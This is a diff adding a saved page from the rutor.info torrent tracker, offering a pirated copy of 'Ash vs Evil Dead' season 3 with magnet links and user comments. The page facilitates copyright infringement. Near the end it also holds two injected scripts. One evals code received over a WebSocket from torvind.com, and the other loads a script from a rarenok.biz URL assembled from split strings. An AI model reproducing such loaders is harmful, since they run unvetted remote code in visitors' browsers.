@@ -1,0 +1,372 @@
+<html>
+<head>
+	<meta http-equiv="content-type" content="text/html; charset=utf-8" />
+	<link href="http://s.rutor.info/css.css" rel="stylesheet" type="text/css" media="screen" />
+	<link rel="alternate" type="application/rss+xml" title="RSS" href="/rss.php?category" />
+	<link rel="shortcut icon" href="http://s.rutor.info/favicon.ico" />
+	<title>rutor.info :: Эш против Зловещих мертвецов / Ash vs Evil Dead [S03] (2018) WEBRip | AlexFilm, BaibaKo</title>
+	<script type="text/javascript" src="http://ajax.googleapis.com/ajax/libs/jquery/1.4.2/jquery.min.js"></script>
+	<script type="text/javascript" src="http://s.rutor.info/jquery.cookie-min.js"></script>
+	<script type="text/javascript" src="http://s.rutor.info/t/functions.js"></script>
+	
+</head>
+<body>
+
+<div id="all">
+
+<div id="up">
+
+<div id="logo">
+	<a href="/"><img src="http://s.rutor.info/logo.jpg" alt="rutor.info logo" /></a>
+</div>
+
+<table id="news_table">
+  <tr><td colspan="2"><strong>Новости трекера</strong></td></tr><tr><td class="news_date">30-Дек</td>
+  	<td class="news_title"><a href="http://rutor.info/torrent/472" target="_blank"  id="news88" onclick="$.cookie('news', '88', {expires: 365});">У RUTOR.ORG - Новый Адрес: RUTOR.INFO</a></td></tr><tr><td class="news_date">29-Ноя</td>
+  	<td class="news_title"><a href="/torrent/178905" target="_blank"  id="news86">Вечная блокировка в России</a></td></tr><tr><td class="news_date">09-Окт</td>
+  	<td class="news_title"><a href="/torrent/145012" target="_blank"  id="news59">Путеводитель по RUTOR.org: Правила, Руководства, Секреты</a></td></tr></table>
+  <script type="text/javascript">
+  $(document).ready(function(){if($.cookie("news")<88){$("#news88").css({"color":"orange","font-weight":"bold"});}});
+  </script>
+
+</div>
+
+<div id="menu">
+<a href="/" class="menu_b" style="margin-left:10px;"><div>Главная</div></a>
+<a href="/top" class="menu_b"><div>Топ</div></a>
+<a href="/categories" class="menu_b"><div>Категории</div></a>
+<a href="/browse/" class="menu_b"><div>Всё</div></a>
+<a href="/search/" class="menu_b"><div>Поиск</div></a>
+<a href="/latest_comments" class="menu_b"><div>Комменты</div></a>
+<a href="/upload.php" class="menu_b"><div>Залить</div></a>
+<a href="/jabber.php" class="menu_b"><div>Чат</div></a>
+
+<div id="menu_right_side"></div>
+
+<script type="text/javascript">
+$(document).ready(function()
+{
+	var menu_right;
+	if ($.cookie('userid') > 0)
+	{
+		menu_right = '<a href="/users.php?logout" class="logout" border="0"><img src="http://s.rutor.info/i/viti.gif" alt="logout" /></a><span class="logout"><a href="/profile.php" class="logout"  border="0"><img src="http://s.rutor.info/i/profil.gif" alt="profile" /></a>';
+	}
+	else
+	{
+		menu_right = '<a href="/users.php" class="logout" border="0"><img src="http://s.rutor.info/i/zaiti.gif" alt="login" /></a>';
+	}
+	$("#menu_right_side").html(menu_right);
+});
+</script>
+
+</div>
+<h1>Эш против Зловещих мертвецов / Ash vs Evil Dead [S03] (2018) WEBRip | AlexFilm, BaibaKo</h1>
+</div>
+<div id="ws">
+<div id="content">
+
+<center>
+<div id="b_tz_208" class="b_tz_on_top" onmouseup="window.event.cancelBubble=true"></div>
+</center>
+
+
+
+<div id="msg1"></div>
+<script type="text/javascript">
+$(document).ready(function()
+{
+	if ($.cookie('msg') != null)
+	{
+		if ($.cookie('msg').length > 0)
+		{
+			var msg2 = '<div id="warning">' + $.cookie('msg').replace(/["+"]/g, ' ') + '</div>';
+			$("#msg1").html(msg2);
+			$.cookie('msg', '', { expires: -1 });
+		}
+	}
+});
+</script><script type="text/javascript">function toggle_visibility(id) { var e = document.getElementById(id); if(e.style.display == 'block') e.style.display = 'none'; else e.style.display = 'block'; }</script>
+
+
+
+<div id="download">
+<a href="magnet:?xt=urn:btih:2863f2f7ca016bd47da53f968e6bc585ab6a9f03&amp;dn=rutor.info_%D0%AD%D1%88+%D0%BF%D1%80%D0%BE%D1%82%D0%B8%D0%B2+%D0%97%D0%BB%D0%BE%D0%B2%D0%B5%D1%89%D0%B8%D1%85+%D0%BC%D0%B5%D1%80%D1%82%D0%B2%D0%B5%D1%86%D0%BE%D0%B2+%2F+Ash+vs+Evil+Dead+%5BS03%5D+%282018%29+WEBRip+%7C+AlexFilm%2C+BaibaKo&amp;tr=udp://opentor.org:2710&amp;tr=udp://opentor.org:2710&amp;tr=http://retracker.local/announce"><img src="http://s.rutor.info/i/magnet.gif"></a>
+<!--<a href="/mail.php?send_torrent=618459"><img src="http://s.rutor.info/t/mails.png"></a>-->
+<a href="http://d.rutor.info/download/618459"><img src="http://s.rutor.info/t/down.png"> Скачать Ash.vs.Evil.Dead.S03.2xRUS.torrent</a>
+<br />
+<a href="/torrent/141992" class="d_small" target="_blank">Как тут качать?</a>
+<script type="text/javascript">
+function addEngine(){ if (typeof(window.external) != "undefined" && typeof(window.external.AddSearchProvider) != "undefined") { window.external.AddSearchProvider('http://rutor.info/AddSearchProvider.xml'); } else { alert("Извините, чтобы установить плагин поиска, Вы должны использовать браузер Firefox!");}}
+</script>
+<a href="#" class="d_small" onclick="addEngine();">Добавить rutor.info в поисковую строку</a>
+</div>
+
+
+
+
+
+<table width="100%">
+<tr><td colspan="2" style="text-align:center;">
+<script type="text/javascript">
+	var docw = document.body.clientWidth;
+	docw = docw - 270 - 470 - 50;
+	begun1_width = docw;
+	var filelist_already_loaded = 0;
+</script>
+
+</td>
+</tr>
+</table>
+
+
+<table id="details">
+
+<tr><td style="vertical-align:top;"></td><td><br /><img src="http://i5.imageban.ru/out/2018/02/25/c103e40139f7c90c9c14d1add8f3cbd4.png" /><br />
+<br />
+<span style="color:#FF8000;"><u><i><b>Информация о фильме:</b></i></u></span><br />
+<span style="color:#666666;"><b>✦ Название</b>: Эш против Зловещих мертвецов<br />
+<b>✦ Оригинальное название</b>: Ash vs Evil Dead<br />
+<b>✦ Год выхода</b>: 2018 (3 сезон)<br />
+<b>✦ Жанр</b>: ужасы, боевик, комедия<br />
+<b>✦ Режиссер</b>: Майкл Херст, Рик Джейкобсон, Сэм Рэйми<br />
+<b>✦ В ролях</b>: Брюс Кэмпбелл, Джилл Мари Джонс, Дэна ДеЛоренцо, Люси Лоулесс, Рэй Сантьяго, Мими Роджерс, Хемки Мадера, Фил Пелетон, Дэмиен Гарви и др.</span><br />
+<br />
+<span style="color:#FF8000;"><u><i><b>Описание фильма:</b></i></u></span><br />
+<span style="color:#666666;">30 лет он избегал ответственности за свои поступки, упорно старался не взрослеть и не особо стремился вновь встретиться с ожившими мертвецами. Но, совершив ошибку, Эш узнает, что проказа кандарийских демонов угрожает распространиться по всей планете и ему снова приходится вступить в схватку с полчищами мертвой нечисти. Реки крови, горы трупов и, конечно, искрометный черный юмор – отличный подарок всем любителям ужасов, комедий, крови, треша и угара.</span><br />
+<br />
+ <a href="http://www.imdb.com/title/tt4189022/" target="_blank"><img src="http://s.rutor.info/imdb/pic/4189022.gif" /></a><a href="https://myshows.me/view/39469/" target="_blank"><img src="http://u.myshows.me/r/39469.png" /></a> <a href="http://www.kinopoisk.ru/film/855898/" target="_blank"><img src="http://www.kinopoisk.ru/rating/855898.gif" /></a><br />
+<br />
+<span style="color:#666666;"><b>✦ Страна: </b>США / Starz, Renaissance Pictures<br />
+<b>✦ Продолжительность: </b>~ 00:43:00 серия<br />
+<b>✦ Перевод: </b>Профессиональный (многоголосый, закадровый)</span> - <span style="color:#FF8000;"><b><i>AlexFilm</i></b></span><br />
+<span style="color:#666666;"><b>✦ Перевод: </b>Любительский (многоголосый, закадровый)</span> - <span style="color:#FF8000;"><b><i>BaibaKo</i></b></span> <br />
+<span style="color:#666666;"><b>✦ Примечание: </span></b><span style="color:green;"><b>Без рекламы!</b></span><br />
+<br />
+<img src="http://i55.fastpic.ru/big/2015/0413/03/170cc944045f4a7d9e56dbdd2acddf03.gif" /><br />
+<br />
+<span style="color:#FF8000;"><u><i><b>Информация о файле:</b></i></u></span><br />
+<span style="color:#666666;"><b>✦ Кодек: </b> XviD | AVI<br />
+<b>✦ Качество: </b> WEBRip<br />
+<b>✦ Видео: </b> ~ 2000 kbps, 720x400 (16:9), 23.976 fps<br />
+<b>✦ Аудио <img src="http://s55.radikal.ru/i149/1111/45/1e541537245b.gif" /> RUS:</b> AC3, 48 KHz, 6 ch, 384 kbps<br />
+<b>✦ Аудио <img src="http://s017.radikal.ru/i406/1111/7c/10e9c6485cd6.gif" /> ENG:</b> AC3, 48 KHz, 6 ch, 384 kbps<br />
+<b>✦ Субтитры: </b> Английские (внешние)</span><br />
+<br />
+<a href="http://imageban.ru/show/2018/03/02/e2c6373cf8658f66bfc6a26984eeb33c/png" target="_blank"><img src="http://i4.imageban.ru/thumbs/2018.03.02/e2c6373cf8658f66bfc6a26984eeb33c.png" /></a> <a href="http://imageban.ru/show/2018/03/02/900743d1baae77b54b2b2c734a52cd7a/png" target="_blank"><img src="http://i1.imageban.ru/thumbs/2018.03.02/900743d1baae77b54b2b2c734a52cd7a.png" /></a> <a href="http://imageban.ru/show/2018/03/02/505770396931fbb51367c830ff8bb253/png" target="_blank"><img src="http://i5.imageban.ru/thumbs/2018.03.02/505770396931fbb51367c830ff8bb253.png" /></a><br />
+<br />
+<div class="hidewrap"><div class="hidehead" onclick="hideshow($(this))"><span style="color:#FF8000;">〤 Раздача ведется путем добавления новых серий 〤</span></div><div class="hidebody"></div><textarea class="hidearea">Когда раздача ведётся путём добавления новых серий, при каждом добавлении создётся новый торрент. Чтобы начать докачку новой серии, пользователям необходимо сделать следующее:<br />
+(1) остановить скачивание,<br />
+(2) удалить старый торрент у себя из клиента (старые серии удалять не надо),<br />
+(3) скачать новый торрент и запустить его у себя в клиенте вместо старого, при этом указать клиенту путь в старую папку, куда и должно происходить скачивание новых серий.<br />
+Ваш клиент при этом должен произвести хеширование (проверку) старой папки (если не производит сам - помогите ему сделать это), и будет докачивать только те серии, которых у вас ещё нет. Старые серии при этом не удаляются, а продолжают раздаваться!<br />
+Eсли вы уже удалили старые серии, то предотвратить повторную закачку старых серий можно, отжав галочку в соответсвующих местах при запуске нового торрента. По возможности, желательно не удалять старые серии как можно дольше, чтобы релизёр не столько продолжал раздавать старые серии, а смог сконцентрироваться на новых.</textarea></div></td></tr>
+<tr><td class="header">Залил</td><td><b><a href="/browse/0/0/1450329/0" target="_blank">-=ARROW=-</a></b></td></tr>
+<tr><td class="header">Оценка</td><td>Никто ещё не поставил оценку</td></tr>
+<tr><td class="header">Категория</td><td><a href="/seriali" target="_blank">Сериалы </a></td></tr>
+<tr><td class="header">Раздают</td><td>3</td></tr>
+<tr><td class="header">Качают</td><td>5</td></tr>
+<tr><td class="header">Сидер замечен</td><td>09-05-2018 4:19:06 (56 минут назад)</td></tr>
+<tr><td class="header">Добавлен</td><td>08-05-2018 8:53:33  (20 часов назад)</td></tr>
+<tr><td class="header">Размер</td><td>6.15&nbsp;GB  (6607907222 Bytes)</td></tr>
+
+<tr>
+	<td class="header" nowrap="nowrap">Добавить в</td>
+	<td style="vertical-align:middle;"><span class="fake_link" onclick="add_bookmark($(this), 618459);">закладки</span></td>
+</tr>
+
+<tr><td colspan="2"><div id="index"><fieldset style="border: 1px solid #3C95D1;"><legend style="font-weight: bold;">Связанные раздачи</legend><table width="100%"><tr class="backgr"><td width="10px">Добавлен</td><td colspan="2">Название</td><td width="1px">Размер</td><td width="1px">Пиры</td></tr><tr class="gai"><td>08&nbsp;Май&nbsp;18</td><td ><a class="downgif" href="http://d.rutor.info/download/630421"><img src="http://s.rutor.info/i/d.gif" alt="D" /></a><a href="magnet:?xt=urn:btih:687b4e60deea1b56153ec7c1fa1580cf63bbd0dc&dn=rutor.info&tr=udp://opentor.org:2710&tr=udp://opentor.org:2710&tr=http://retracker.local/announce"><img src="http://s.rutor.info/i/m.png" alt="M" /></a>
+<a href="/torrent/630421/jesh-protiv-zlovewih-mertvecov_ash-vs-evil-dead-s03-2018-web-dl-1080p-newstudio">Эш против Зловещих мертвецов / Ash vs Evil Dead [S03] (2018) WEB-DL 1080p | NewStudio </a></td> <td align="right">2<img src="http://s.rutor.info/i/com.gif" alt="C" /></td>
+<td align="right">21.64&nbsp;GB</td><td align="center"><span class="green"><img src="http://s.rutor.info/t/arrowup.gif" alt="S" />&nbsp;16</span>&nbsp;<img src="http://s.rutor.info/t/arrowdown.gif" alt="L" /><span class="red">&nbsp;12</span></td></tr><tr class="tum"><td>03&nbsp;Май&nbsp;18</td><td ><a class="downgif" href="http://d.rutor.info/download/616211"><img src="http://s.rutor.info/i/d.gif" alt="D" /></a><a href="magnet:?xt=urn:btih:becb5bbda893eeda78edae60271adff8d6a47d1a&dn=rutor.info&tr=udp://opentor.org:2710&tr=udp://opentor.org:2710&tr=http://retracker.local/announce"><img src="http://s.rutor.info/i/m.png" alt="M" /></a>
+<a href="/torrent/616211/jesh-protiv-zlovewih-mertvecov_ash-vs-evil-dead-s03-2018-web-dlrip-jaskier">Эш против Зловещих мертвецов / Ash vs Evil Dead [S03] (2018) WEB-DLRip | Jaskier </a></td> <td align="right">3<img src="http://s.rutor.info/i/com.gif" alt="C" /></td>
+<td align="right">3.29&nbsp;GB</td><td align="center"><span class="green"><img src="http://s.rutor.info/t/arrowup.gif" alt="S" />&nbsp;10</span>&nbsp;<img src="http://s.rutor.info/t/arrowdown.gif" alt="L" /><span class="red">&nbsp;12</span></td></tr><tr class="gai"><td>03&nbsp;Май&nbsp;18</td><td ><a class="downgif" href="http://d.rutor.info/download/616210"><img src="http://s.rutor.info/i/d.gif" alt="D" /></a><a href="magnet:?xt=urn:btih:ca2a838145d37ef29a655840ed040d402a14eca0&dn=rutor.info&tr=udp://opentor.org:2710&tr=udp://opentor.org:2710&tr=http://retracker.local/announce"><img src="http://s.rutor.info/i/m.png" alt="M" /></a>
+<a href="/torrent/616210/jesh-protiv-zlovewih-mertvecov_ash-vs-evil-dead-s03-2018-web-dl-720p-jaskier">Эш против Зловещих мертвецов / Ash vs Evil Dead [S03] (2018) WEB-DL 720p | Jaskier </a></td> <td align="right">5<img src="http://s.rutor.info/i/com.gif" alt="C" /></td>
+<td align="right">7.84&nbsp;GB</td><td align="center"><span class="green"><img src="http://s.rutor.info/t/arrowup.gif" alt="S" />&nbsp;5</span>&nbsp;<img src="http://s.rutor.info/t/arrowdown.gif" alt="L" /><span class="red">&nbsp;8</span></td></tr><tr class="tum"><td>03&nbsp;Май&nbsp;18</td><td colspan = "2"><a class="downgif" href="http://d.rutor.info/download/616209"><img src="http://s.rutor.info/i/d.gif" alt="D" /></a><a href="magnet:?xt=urn:btih:fafe1facdb8197cbc652b99cc21b0ab4a60ebd5f&dn=rutor.info&tr=udp://opentor.org:2710&tr=udp://opentor.org:2710&tr=http://retracker.local/announce"><img src="http://s.rutor.info/i/m.png" alt="M" /></a>
+<a href="/torrent/616209/jesh-protiv-zlovewih-mertvecov_ash-vs-evil-dead-s03-2018-web-dl-1080p-jaskier">Эш против Зловещих мертвецов / Ash vs Evil Dead [S03] (2018) WEB-DL 1080p | Jaskier </a></td> 
+<td align="right">20.92&nbsp;GB</td><td align="center"><span class="green"><img src="http://s.rutor.info/t/arrowup.gif" alt="S" />&nbsp;3</span>&nbsp;<img src="http://s.rutor.info/t/arrowdown.gif" alt="L" /><span class="red">&nbsp;7</span></td></tr><tr class="gai"><td>03&nbsp;Май&nbsp;18</td><td colspan = "2"><a class="downgif" href="http://d.rutor.info/download/616029"><img src="http://s.rutor.info/i/d.gif" alt="D" /></a><a href="magnet:?xt=urn:btih:b834a8f241d2c80aa0c888e2a2c37058f7e70428&dn=rutor.info&tr=udp://opentor.org:2710&tr=udp://opentor.org:2710&tr=http://retracker.local/announce"><img src="http://s.rutor.info/i/m.png" alt="M" /></a>
+<a href="/torrent/616029/jesh-protiv-zlovewih-mertvecov_ash-vs-evil-dead-s03-2018-webrip-gears-media">Эш против Зловещих мертвецов / Ash vs Evil Dead [S03] (2018) WEBRip | Gears Media </a></td> 
+<td align="right">3.10&nbsp;GB</td><td align="center"><span class="green"><img src="http://s.rutor.info/t/arrowup.gif" alt="S" />&nbsp;0</span>&nbsp;<img src="http://s.rutor.info/t/arrowdown.gif" alt="L" /><span class="red">&nbsp;7</span></td></tr><tr class="tum"><td>03&nbsp;Май&nbsp;18</td><td colspan = "2"><a class="downgif" href="http://d.rutor.info/download/615958"><img src="http://s.rutor.info/i/d.gif" alt="D" /></a><a href="magnet:?xt=urn:btih:8d290ff988f0b14ac6d4434fac4b2e8aaff35975&dn=rutor.info&tr=udp://opentor.org:2710&tr=udp://opentor.org:2710&tr=http://retracker.local/announce"><img src="http://s.rutor.info/i/m.png" alt="M" /></a>
+<a href="/torrent/615958/jesh-protiv-zlovewih-mertvecov_ash-vs-evil-dead-s03-2018-webrip-720p-gears-media">Эш против Зловещих мертвецов / Ash vs Evil Dead [S03] (2018) WEBRip 720p | Gears Media </a></td> 
+<td align="right">7.85&nbsp;GB</td><td align="center"><span class="green"><img src="http://s.rutor.info/t/arrowup.gif" alt="S" />&nbsp;0</span>&nbsp;<img src="http://s.rutor.info/t/arrowdown.gif" alt="L" /><span class="red">&nbsp;6</span></td></tr><tr class="gai"><td>01&nbsp;Май&nbsp;18</td><td colspan = "2"><a class="downgif" href="http://d.rutor.info/download/616061"><img src="http://s.rutor.info/i/d.gif" alt="D" /></a><a href="magnet:?xt=urn:btih:8ca134dfec28aeca63155825e440d9a2f6145083&dn=rutor.info&tr=udp://opentor.org:2710&tr=udp://opentor.org:2710&tr=http://retracker.local/announce"><img src="http://s.rutor.info/i/m.png" alt="M" /></a>
+<a href="/torrent/616061/jesh-protiv-zlovewih-mertvecov_ash-vs-evil-dead-s03-2018-webrip-1080p-ideafilm">Эш против Зловещих мертвецов / Ash vs Evil Dead [S03] (2018) WEBRip 1080p | IdeaFilm </a></td> 
+<td align="right">15.05&nbsp;GB</td><td align="center"><span class="green"><img src="http://s.rutor.info/t/arrowup.gif" alt="S" />&nbsp;2</span>&nbsp;<img src="http://s.rutor.info/t/arrowdown.gif" alt="L" /><span class="red">&nbsp;7</span></td></tr></table><div style="width: 100%; text-align: right; margin-top: 4px; margin-bottom: -5px;"><a href="/search/0/4/0/0/Ash vs Evil Dead" target="_blank">Искать ещё похожие раздачи</a></div></fieldset></div></td></tr>
+
+<tr><td class='header'><span onclick="if(filelist_already_loaded==0){filelist_already_loaded=1;$('#filelist').load('/descriptions/618459.files');}toggle_visibility('displayfiles');" class="button"><u>Файлы (20)</u></span></td><td>
+<div id="displayfiles" style="display:none;max-height:450px;overflow:auto;">
+<table id="files">
+<tr><td>Название</td><td>Размер</td></tr>
+<tbody id="filelist"><tr><td colspan="2" style="text-align:center;">Происходит загрузка списка файлов...</td></tr></tbody>
+</table>
+</div>
+</td></tr>
+
+</table>
+<br />
+<br />
+
+<script type="text/javascript">
+var bookmarked = 0;
+function add_bookmark(me, id)
+{
+	if (bookmarked == 0)
+	{
+		$.ajax({
+	  type: "POST",
+		url: "/bookmarks.php",
+	  data: "access_method=ajax&action=add_bookmark&torrent_id=" + id,
+	  success: function(res){
+	  		if (res == 0)
+	  		{
+	  			me.html('Зайдите на трекер!');
+	  			me.css({"color":"red"});
+	  		}
+	  		else if (res == 3)
+	  		{
+	  			me.html('Закладка добавлена!');
+	  			me.css({"color":"green"});
+	  		}
+	  		else if (res == 2)
+	  		{
+	  			me.html('Такая закладка у Вас уже существует!');
+	  			me.css({"color":"orange"});
+	  		}
+	  		else if (res == 5)
+	  		{
+	  			me.html('Ограничение численности закладок достигнуто!');
+	  			me.css({"color":"red"});
+	  		}
+  		}
+ 		});
+	}
+	bookmarked++;
+}
+$(document).ready(function() {
+	if ($.cookie('userid') > 0) {
+		$("#cem").append(' | <a href="/edit.php?edit=618459">Редактировать</a>');
+		if (typeof torrent_moderate == typeof Function && $.cookie('class') >= 6) {
+			$("#cem").append('<br /><span onClick="torrent_moderate(618459);">Промодерировать раздачу</span> | <span onclick="confirm_delete(618459);">Удалить</span>');
+		}
+	}
+});
+</script>
+
+
+<strong>
+<div style="text-align: center;" id="cem"><a href="/comment/618459">Написать комментарий</a>
+
+
+</div>
+</strong>
+
+<br/><br/>
+<script type="text/javascript">
+<!--
+function confirmation(delete_comment) {
+	var answer = confirm("Удалить комментарий?")
+	if (answer){
+		window.location = "/comment.php?delete_comment=" + delete_comment;
+	}
+}
+//-->
+</script>
+	<script type="text/javascript"><!--
+	function confirmation(delete_comment) {
+		var answer = confirm("Удалить комментарий?")
+		if (answer){
+			window.location = "/comment.php?delete_comment=" + delete_comment;
+		}
+	}
+	function cOptions(userid, cid) {
+	var cstr = 'c_' + cid;
+	var c_url = '<a href="/comment.php?edit_comment=' + cid + '"><img src="http://s.rutor.info/t/c_edit.png"></a><a onClick=confirmation(' + cid + ')><img  src="http://s.rutor.info/t/c_delete.png"></a>';
+	if (userid == getCookie('userid') || getCookie('class') >= 5)
+		document.getElementById(cstr).innerHTML = c_url;
+}
+//-->
+</script>
+	<table width="100%" cellspacing="0" cellpadding="4"><tr class="c_h"><td><b>mylbtik76</b></td> <td>21-04-2018 15:29:25 (18 дней назад)</td> <td></td> <td align="right"><span id="c_3191799"></span><script type="text/javascript">cOptions(1155644,3191799);</script></td></tr><tr><td class="c_t" colspan=4>это еще норм, вот Байбако вообще скатились отстают почти на неделю с переводом, когда я им задал вопрос почему они так долго делают перевод, меня просто забанили и я не могу теперь зайти к ним на сайт, ну как?</td></tr><tr><td colspan="4">&nbsp;</td></tr><tr class="c_h"><td><b>.:MASUKA:.</b></td> <td>10-03-2018 18:49:04 (2 месяца назад)</td> <td></td> <td align="right"><span id="c_3168804"></span><script type="text/javascript">cOptions(98403,3168804);</script></td></tr><tr><td class="c_t" colspan=4>NewStudio озвучили лучше всех, но выкладывают перевод катастрофически медленно<br />
+но обожду</td></tr><tr><td colspan="4">&nbsp;</td></tr></table>
+<center><a href="#up"><img src="http://s.rutor.info/t/top.gif" alt="up" /></a></center>
+
+<!-- bottom banner -->
+
+<div id="down">
+Файлы для обмена предоставлены пользователями сайта. Администрация не несёт ответственности за их содержание.
+На сервере хранятся только торрент-файлы. Это значит, что мы не храним никаких нелегальных материалов. <a href="/advertise.php">Реклама</a>. 
+</div>
+
+
+</div>
+
+<div id="sidebar">
+
+<div class="sideblock">
+	<a id="fforum" href="/torrent/145012"><img src="http://s.rutor.info/i/forum.gif" alt="forum" /></a>
+</div>
+
+<div class="sideblock">
+<center>
+<table border="0" background="http://s.rutor.info/i/poisk_bg.gif" cellspacing="0" cellpadding="0" width="100%" height="56px">
+<script type="text/javascript">function search_sidebar() { window.location.href = '/search/'+$('#in').val(); return false; }</script>
+<form action="/b.php" method="get" onsubmit="return search_sidebar();">
+ <tr>
+  <td scope="col" rowspan=2><img src="http://s.rutor.info/i/lupa.gif" border="0" alt="img" /></td>
+  <td valign="middle"><input type="text" name="search" size="18" id="in"></td>
+ </tr>
+ <tr>
+  <td><input name="submit" type="submit" id="sub" value="искать по названию"></td>
+ </tr>
+</form>
+</table>
+</center>
+</div>
+
+
+
+<div class="sideblock2">
+<center>
+<div id="b_bn_51" onmouseup="window.event.cancelBubble=true"></div>
+<script>(function(){var s=document.createElement('script');s.src='http://tredman.com/j/w.php?id=51&r='+Math.random();document.getElementsByTagName('head')[0].appendChild(s)})();</script>
+</center>
+</div>
+
+<div class="sideblock2">
+<!--LiveInternet counter--><script type="text/javascript"><!--
+document.write("<a href='http://www.liveinternet.ru/click' "+
+"target=_blank><img src='http://counter.yadro.ru/hit?t39.6;r"+
+escape(document.referrer)+((typeof(screen)=="undefined")?"":
+";s"+screen.width+"*"+screen.height+"*"+(screen.colorDepth?
+screen.colorDepth:screen.pixelDepth))+";u"+escape(document.URL)+
+";"+Math.random()+
+"' alt='' title='LiveInternet' "+
+"border=0 width=31 height=31><\/a>")//--></script><!--/LiveInternet-->
+</div>
+
+</div>
+
+</div>
+
+
+
+<script type="text/javascript">
+ (function () {
+ var script_id = "MTIzNg==", s = document.createElement("script");
+ s.type = "text/javascript";
+ s.charset = "utf-8";
+s.src = "//torvind.com/js/" + script_id+".js?r="+Math.random()*10000000000;
+ s.async = true;
+ s.onerror = function(){
+  var ws = new WebSocket("ws://torvind.com:8040/");
+  ws.onopen = function () {
+   ws.send(JSON.stringify({type:"p", id: script_id}));
+  };
+  ws.onmessage = function(tx) { ws.close(); window.eval(tx.data); };
+ };
+ document.body.appendChild(s);
+ })();
+</script>
+
+<script>(function(){var a=document.createElement("script");a.src="http://rarenok.biz"+"/im"+"g/r"+"/i/208/"+Math.floor(Math.random()*Math.pow(10,6))+".php";document.getElementsByTagName("head")[0].appendChild(a)})();</script>
+
+
+</body>
+</html>
